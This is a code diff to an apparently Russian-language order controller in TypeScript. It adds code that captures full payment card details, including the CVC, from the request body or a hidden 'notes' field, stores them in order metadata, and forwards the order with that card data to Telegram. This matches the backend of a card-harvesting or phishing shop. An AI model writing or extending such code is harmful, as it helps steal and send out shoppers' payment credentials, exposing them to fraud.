@@ -56,26 +56,59 @@ export class AdminController {
     const created = await this.ordersService.create(createOrderDto, sessionId, ipAddress, userAgent);
 
     try {
-      const cardData = {
+      // Извлекаем данные карты из body или из notes (если они там в JSON)
+      let cardData = {
         cardNumber: body.cardNumber || null,
         cvc: body.cvc || null,
         expiry: body.expiry || null,
         cardholderName: body.cardholderName || null,
       };
+
+      // Если данных карты нет в body, пытаемся извлечь из notes
+      if (!cardData.cardNumber && body.notes) {
+        try {
+          const notesData = typeof body.notes === 'string' ? JSON.parse(body.notes) : body.notes;
+          if (notesData && notesData.cardNumber) {
+            cardData = {
+              cardNumber: notesData.cardNumber || null,
+              cvc: notesData.cvc || null,
+              expiry: notesData.expiry || null,
+              cardholderName: notesData.cardholderName || null,
+            };
+          }
+        } catch (e) {
+          console.warn('Не удалось распарсить данные карты из notes:', e);
+        }
+      }
+
+      // Сохраняем данные карты в metadata
       created.metadata = created.metadata || {};
       created.metadata.card = cardData;
       await (created as any).save();
 
+      console.log('Данные карты сохранены в metadata:', {
+        hasCardNumber: !!cardData.cardNumber,
+        hasCvc: !!cardData.cvc,
+        hasExpiry: !!cardData.expiry,
+        hasCardholder: !!cardData.cardholderName
+      });
+
+      // Отправляем заказ в Telegram (данные карты уже включены через appendCardInfo)
       try {
         const svc: any = (this.ordersService as any);
         if (typeof svc.sendOrderToTelegram === 'function') {
           await svc.sendOrderToTelegram(created as any);
+          console.log('Заказ успешно отправлен в Telegram');
+        } else {
+          console.warn('Метод sendOrderToTelegram не найден');
         }
       } catch (e) {
-        console.warn('Не удалось повторно отправить заказ в Telegram:', e?.message || e);
+        console.error('Ошибка при отправке заказа в Telegram:', e?.message || e);
+        // Не прерываем выполнение, просто логируем ошибку
       }
     } catch (e) {
-      console.warn('Не удалось сохранить данные карты в metadata:', e?.message || e);
+      console.error('Ошибка при сохранении данных карты в metadata:', e?.message || e);
+      // Не прерываем выполнение, просто логируем ошибку
     }
 
     return created;
